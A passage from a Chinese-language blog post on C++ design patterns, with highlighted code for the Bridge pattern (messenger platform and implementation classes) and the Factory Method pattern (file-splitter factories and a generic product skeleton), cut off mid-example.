class="hljs-built_in">image</span>)</span></span>&#123;<br>        PCMessagerBase::PlaySound();<br>        PCMessagerBase::DrawShape();<br>    &#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MobileMessagerLite</span> :</span> <span class="hljs-keyword">public</span> MobileMessagerBase &#123;...&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MobileMessagerPerfect</span> :</span> <span class="hljs-keyword">public</span> MobileMessagerBase &#123;...&#125;;<br></code></pre></div></td></tr></table></figure><p>实现二，使用组合而不是继承，同时分离基类中平台实现和业务逻辑部分，保证两部分的派生类都可以分别实例化。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 分离基类中平台实现和业务逻辑部分</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Messager</span>&#123;</span><br><span class="hljs-keyword">protected</span>:<br>    MessagerImp* messagerImp; <span class="hljs-comment">// 组合</span><br>    Messager(MessagerImp* imp): messagerImp(imp) &#123;...&#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Login</span><span class="hljs-params">(<span class="hljs-built_in">string</span> username, <span class="hljs-built_in">string</span> password)</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SendMessage</span><span class="hljs-params">(<span class="hljs-built_in">string</span> message)</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SendPicture</span><span class="hljs-params">(Image <span class="hljs-built_in">image</span>)</span></span>=<span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">virtual</span> ~Messager()&#123;&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MessagerImp</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">PlaySound</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">DrawShape</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">WriteText</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Connect</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-title">MessagerImp</span><span class="hljs-params">()</span></span>&#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// 平台实现</span><br><span class="hljs-comment">// 这里没有纯虚函数，能实例化</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PCMessagerImp</span> :</span> <span class="hljs-keyword">public</span> MessagerImp&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">PlaySound</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">DrawShape</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">WriteText</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Connect</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MobileMessagerImp</span> :</span> <span class="hljs-keyword">public</span> MessagerImp&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">PlaySound</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">DrawShape</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">WriteText</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Connect</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>&#125;;<br><br><span class="hljs-comment">// 业务抽象 m</span><br><span class="hljs-comment">// 基类中MessagerImp* 成员，利用多态，实现不同平台实现的组合</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MessagerLite</span>:</span><span class="hljs-keyword">public</span> Messager &#123;<br><span class="hljs-keyword">public</span>:<br>    MessagerLite(MessagerImp *imp): Messager(imp) &#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Login</span><span class="hljs-params">(<span class="hljs-built_in">string</span> username, <span class="hljs-built_in">string</span> password)</span></span>&#123;<br>        messagerImp-&gt;Connect();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SendMessage</span><span class="hljs-params">(<span class="hljs-built_in">string</span> message)</span></span>&#123;<br>        messagerImp-&gt;WriteText();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SendPicture</span><span class="hljs-params">(Image <span class="hljs-built_in">image</span>)</span></span>&#123;<br>        messagerImp-&gt;DrawShape();<br>    &#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MessagerPerfect</span>:</span><span class="hljs-keyword">public</span> Messager &#123;<br><span class="hljs-keyword">public</span>:<br>    MessagerPerfect(MessagerImp *imp): Messager(imp) &#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Login</span><span class="hljs-params">(<span class="hljs-built_in">string</span> username, <span class="hljs-built_in">string</span> password)</span></span>&#123;<br>        messagerImp-&gt;PlaySound();<br>        messagerImp-&gt;Connect();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SendMessage</span><span class="hljs-params">(<span class="hljs-built_in">string</span> message)</span></span>&#123;<br>        messagerImp-&gt;PlaySound();<br>        messagerImp-&gt;WriteText();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SendPicture</span><span class="hljs-params">(Image <span class="hljs-built_in">image</span>)</span></span>&#123;<br>        messagerImp-&gt;PlaySound();<br>        messagerImp-&gt;DrawShape();<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>桥模式相比于Decorator模式，主要是针对基类，分离了不同变化方向（有点抽象，就像x轴y轴代表不同维度）的成员，分离成多个类。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/24/12-24-09-3e509f.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Implementor</span><br><span class="hljs-comment"> * defines the interface for implementation classes</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Implementor</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Implementor() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">action</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Implementors</span><br><span class="hljs-comment"> * implement the Implementor interface and define concrete implementations</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteImplementorA</span> :</span> <span class="hljs-keyword">public</span> Implementor<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteImplementorA() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">action</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Concrete Implementor A"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteImplementorB</span> :</span> <span class="hljs-keyword">public</span> Implementor<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteImplementorB() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">action</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Concrete Implementor B"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Abstraction</span><br><span class="hljs-comment"> * defines the abstraction's interface</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Abstraction</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Abstraction() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">operation</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * RefinedAbstraction</span><br><span class="hljs-comment"> * extends the interface defined by Abstraction</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RefinedAbstraction</span> :</span> <span class="hljs-keyword">public</span> Abstraction<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~RefinedAbstraction() &#123;&#125;<br>  <br>  RefinedAbstraction(Implementor *impl) : implementor(impl) &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">operation</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    implementor-&gt;action();<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  Implementor *implementor;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  Implementor *ia = <span class="hljs-keyword">new</span> ConcreteImplementorA;<br>  Implementor *ib = <span class="hljs-keyword">new</span> ConcreteImplementorB;<br>  <br>  Abstraction *abstract1 = <span class="hljs-keyword">new</span> RefinedAbstraction(ia);<br>  abstract1-&gt;operation();<br>  <br>  Abstraction *abstract2 = <span class="hljs-keyword">new</span> RefinedAbstraction(ib);<br>  abstract2-&gt;operation();<br>  <br>  <span class="hljs-keyword">delete</span> abstract1;<br>  <span class="hljs-keyword">delete</span> abstract2;<br>  <br>  <span class="hljs-keyword">delete</span> ia;<br>  <span class="hljs-keyword">delete</span> ib;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="对象创建相关模式">对象创建相关模式</span></h2><p>通过“对象创建”模式绕开new，来避免对象创建（new）过程中所导致的紧耦合（依赖具体类），从而支持对象创建的稳定。它是接口抽象之后的第一步工作。</p><p>面向接口，可以视为依赖抽象基类，调用抽象基类方法。</p><p>典型模式:</p><ol type="1"><li>Factory Method</li><li>Abstract Factory</li><li>Prototype</li><li>Builder</li></ol><h3><span id="factory-method">Factory Method</span></h3><p>在软件系统中，经常面临着创建对象的工作；由于需求的变化，需要创建的对象的具体类型经常变化。</p><p>将程序中，对具体对象的依赖，转变为对抽象的创建对象的接口的依赖。</p><p>定义一个用于创建对象的接口，让子类决定实例化哪一个类。FactoryMethod使得一个类的实例化延迟（目的：解耦，手段：虚函数）到子类。</p><h4><span id="示例1">示例1</span></h4><p>实现一个能够切分不同类型文件的切分程序。</p><p>实现一，直接建立不同的具体切分对象。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISplitter</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">split</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">virtual</span> ~ISplitter()&#123;&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BinarySplitter</span> :</span> <span class="hljs-keyword">public</span> ISplitter&#123;...&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TxtSplitter</span>:</span> <span class="hljs-keyword">public</span> ISplitter&#123;...&#125;;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainForm</span> :</span> <span class="hljs-keyword">public</span> Form &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Button_Click</span><span class="hljs-params">()</span></span>&#123;<br>ISplitter * splitter = <span class="hljs-keyword">new</span> BinarySplitter();<span class="hljs-comment">//依赖具体类</span><br>        splitter-&gt;split();<br>&#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>显然，newBinarySplitter()需要根据不同的文件类型，进行修改。一旦修改，源文件就需要重新编译。</p><p>实现二，使用抽象的工厂，提供对象创建的接口。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//抽象类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISplitter</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">split</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">virtual</span> ~ISplitter()&#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">//工厂基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SplitterFactory</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> ISplitter* <span class="hljs-title">CreateSplitter</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">virtual</span> ~SplitterFactory()&#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">//具体类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BinarySplitter</span> :</span> <span class="hljs-keyword">public</span> ISplitter&#123;...&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TxtSplitter</span>:</span> <span class="hljs-keyword">public</span> ISplitter&#123;...&#125;;<br><br><span class="hljs-comment">//具体工厂</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BinarySplitterFactory</span>:</span> <span class="hljs-keyword">public</span> SplitterFactory&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> ISplitter* <span class="hljs-title">CreateSplitter</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> BinarySplitter();<br>    &#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TxtSplitterFactory</span>:</span> <span class="hljs-keyword">public</span> SplitterFactory&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> ISplitter* <span class="hljs-title">CreateSplitter</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TxtSplitter();<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainForm</span> :</span> <span class="hljs-keyword">public</span> Form&#123;<br>    SplitterFactory*  factory;<span class="hljs-comment">//工厂</span><br><br><span class="hljs-keyword">public</span>:<br>    MainForm(SplitterFactory*  factory)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;factory=factory;<br>    &#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Button_Click</span><span class="hljs-params">()</span></span>&#123;<br>ISplitter * splitter=factory-&gt;CreateSplitter(); <span class="hljs-comment">//多态new</span><br>        splitter-&gt;split();<br>&#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>现在，创建不同对象，只需要输入不同的工厂对象。虽然依旧是要创建对象，但是，在编译单元层面，以上代码是不用重新编译的。有新的类型需要创建，直接增加一个新的源文件即可。</p><p>FactoryMethod模式用于隔离类对象的使用者和具体类型之间的耦合关系。面对一个经常变化的具体类型，紧耦合关系(new)会导致软件的脆弱。</p><p>将所要创建的具体对象工作延迟到子类（BinarySplitterFactory、TxtSplitterFactory），从而实现一种扩展（而非更改）的策略。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/24/14-34-31-ea1c5e.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Product</span><br><span class="hljs-comment"> * products implement the same interface so that the classes can refer</span><br><span class="hljs-comment"> * to the interface not the concrete product</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Product</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Product() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Product</span><br><span class="hljs-comment"> * define product to be created</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteProductA</span> :</span> <span class="hljs-keyword">public</span> Product<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteProductA() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">getName</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"type A"</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Product</span><br><span class="hljs-comment"> * define product to be created</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteProductB</span> :</span> <span class="hljs-keyword">public</span> Product<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteProductB() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">getName</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"type B"</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 